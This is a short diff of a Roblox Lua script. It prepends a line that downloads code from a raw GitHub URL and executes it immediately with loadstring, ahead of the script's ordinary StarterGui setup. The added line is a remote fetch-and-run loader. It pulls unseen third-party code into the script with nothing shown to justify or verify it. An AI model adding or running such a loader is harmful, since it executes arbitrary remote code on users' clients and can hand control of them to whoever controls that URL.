@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Script-BananaHub/WOW/refs/heads/main/wow"))()
+
 local StarterGui = game:GetService("StarterGui")
 
 -- Wait for game to load
